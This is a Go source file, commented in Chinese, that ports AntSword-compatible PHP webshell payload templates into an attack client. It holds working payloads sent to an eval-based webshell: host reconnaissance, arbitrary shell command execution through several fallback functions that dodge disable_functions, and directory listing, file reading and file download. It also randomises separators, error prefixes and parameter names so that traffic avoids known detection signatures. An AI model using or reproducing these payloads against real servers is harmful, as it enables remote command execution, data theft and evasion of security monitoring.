// Package php 提供 Python demo（antsword_client.py）中 AntSword 兼容的 PHP 模板的 Go 移植。
//
//	本文件定义 PHP 代码片段；renderer 负责把参数名拼进去。
//
// ⚠️ 按照设计文档，这个包是 ADAPTER 不是 core。任何 PHP / AntSword 专属的协议面
//
//	都只能留在这里，不能污染下层。
package php

import (
	"crypto/rand"
	"encoding/hex"
)

// PHPTemplates 包含适配器使用的全部 PHP 代码模板。
type PHPTemplates struct{}

// NewPHPTemplates 构建一个 PHPTemplates 实例。
func NewPHPTemplates() *PHPTemplates { return &PHPTemplates{} }

// randomVar 生成长度为 n 的随机变量名片段。
func randomVar(n int) string {
	buf := make([]byte, (n+1)/2)
	_, _ = rand.Read(buf)
	out := hex.EncodeToString(buf)
	if len(out) > n {
		out = out[:n]
	}
	return out
}

func randomVar6() string { return randomVar(6) }

func randomHex(n int) string {
	buf := make([]byte, (n+1)/2)
	_, _ = rand.Read(buf)
	out := hex.EncodeToString(buf)
	if len(out) > n {
		out = out[:n]
	}
	return out
}

// 模板占位符（与 AntSword 语义一致）。
const (
	placeholderBase64Path = "#{base64::path}"
	placeholderBase64Bin  = "#{base64::bin}"
	placeholderBase64Cmd  = "#{base64::cmd}"
	placeholderBase64Env  = "#{base64::env}"
)

// Separators 包含一对随机分隔符，替代固定特征常量 |||askey||| / |||asline|||。
type Separators struct {
	KeySep  string
	LineSep string
}

// NewSeparators 生成一对随机分隔符字符串。
func NewSeparators() Separators {
	return Separators{
		KeySep:  "|||" + randomHex(8) + "|||",
		LineSep: "|||" + randomHex(8) + "|||",
	}
}

// Info 返回把 OS / 运行时元数据打到 stdout 的 PHP 代码。
func (t *PHPTemplates) Info() (string, map[string]string) {
	code := "$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);"
	code += "if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);"
	code += "$R=\"{$D}\\t\";"
	code += "if(substr($D,0,1)!=\"/\"){foreach(range(\"C\",\"Z\")as $L)if(is_dir(\"{$L}:\"))$R.=\"{$L}:\";}else{$R.=\"/\";}"
	code += "$R.=\"\\t\";"
	code += "$u=(function_exists(\"posix_getegid\"))?@posix_getpwuid(@posix_geteuid()):\"\";"
	code += "$s=($u)?$u[\"name\"]:@get_current_user();"
	code += "$R.=php_uname();$R.=\"\\t{$s}\";echo $R;"
	return code, map[string]string{}
}

// Exec 返回一段用多种 fallback（system / passthru / shell_exec / exec / popen / proc_open）
//
//	执行 shell 命令的 PHP 代码。
//
// ⚠️ @eval($_POST['pwd']) 执行本段代码时 PHP 变量 ($s, $p ...) 会被展开，
//
//	因此双引号字符串里出现的 $ 都必须转义成 \$。本函数内部统一使用反引号
//	原生字符串，避免 Go 和 PHP 双重转义互相打架。
func (t *PHPTemplates) Exec() (string, map[string]string) {
	v := [3]string{randomVar6(), randomVar6(), randomVar6()}
	seps := NewSeparators()

	code := "" +
		"$p=base64_decode(substr($_POST['" + v[0] + "'],0));" +
		"$s=base64_decode(substr($_POST['" + v[1] + "'],0));" +
		"$envstr=@base64_decode(substr($_POST['" + v[2] + "'],0));" +
		"$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
		"$c=(substr($d,0,1)=='/')?'-c ' . '\"' . $s . '\"' : '/c ' . '\"' . $s . '\"';" +
		"if(substr($d,0,1)=='/'){" +
		"  @putenv('PATH=' . getenv('PATH') . ':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');" +
		"}else{" +
		"  @putenv('PATH=' . getenv('PATH') . ';C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;');" +
		"}" +
		"if(!empty($envstr)){$envarr=explode('" + seps.LineSep + "',$envstr);foreach($envarr as $v){if(!empty($v)){@putenv(str_replace('" + seps.KeySep + "','=',$v));}}}" +
		"$r=$p.' '.$c;" +
		"function fe($f){$d=explode(',',@ini_get('disable_functions'));" +
		"if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}" +
		"return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));}" +
		"function runcmd($c){$ret=0;$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
		"if(fe('system')){@system($c,$ret);}" +
		"elseif(fe('passthru')){@passthru($c,$ret);}" +
		"elseif(fe('shell_exec')){print(@shell_exec($c));}" +
		"elseif(fe('exec')){@exec($c,$o,$ret);print(join(\"\\n\",$o));}" +
		"elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}" +
		"elseif(fe('proc_open')){$p=@proc_open($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}$ret=0;@fclose($io[1]);@fclose($io[2]);@proc_close($p);}" +
		"else{$ret=127;}" +
		"return $ret;}" +
		"$ret=@runcmd($r . ' 2>&1');" +
		"if($ret!=0){echo 'ret=' . $ret;}"

	params := map[string]string{
		v[0]: placeholderBase64Bin,
		v[1]: placeholderBase64Cmd,
		v[2]: placeholderBase64Env,
	}
	_ = seps
	return code, params
}

// FileList 返回一段 PHP 目录列表代码，使用动态错误前缀替代固定的 ERROR://REDBEAN。
func (t *PHPTemplates) FileList() (string, map[string]string) {
	v := randomVar6()
	errPrefix := "ERR:" + randomHex(8) + ":"
	code := "$D=base64_decode(substr($_POST[\"" + v + "\"],0));"
	code += "if(substr($D,-1)!=\"/\"){$D.=\"/\";}"
	code += "$F=@opendir($D);if($F===false){echo(\"" + errPrefix + "PATH_UNAVAILABLE\");"
	code += "}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date(\"Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}"
	return code, map[string]string{v: placeholderBase64Path}
}

// FileRead 返回一段二进制安全的 PHP 读文件代码，使用动态错误前缀。
func (t *PHPTemplates) FileRead() (string, map[string]string) {
	v := randomVar6()
	errPrefix := "ERR:" + randomHex(8) + ":"
	code := "$F=base64_decode(substr($_POST[\"" + v + "\"],0));"
	code += "$P=@fopen($F,\"rb\");if($P===false){echo(\"" + errPrefix + "FILE_OPEN_FAILED\");}else{$C=@stream_get_contents($P);@fclose($P);if($C===false){echo(\"" + errPrefix + "FILE_READ_FAILED\");}else{echo $C;}}"
	return code, map[string]string{v: placeholderBase64Path}
}

// FileDownload 返回一段二进制安全的 PHP dump 文件代码，使用动态错误前缀。
func (t *PHPTemplates) FileDownload() (string, map[string]string) {
	v := randomVar6()
	errPrefix := "ERR:" + randomHex(8) + ":"
	code := "$F=base64_decode(substr($_POST[\"" + v + "\"],0));"
	code += "$P=@fopen($F,\"rb\");if($P===false){echo(\"" + errPrefix + "FILE_OPEN_FAILED\");}else{@fclose($P);$N=@readfile($F);if($N===false){echo(\"" + errPrefix + "FILE_READ_FAILED\");}}"
	return code, map[string]string{v: placeholderBase64Path}
}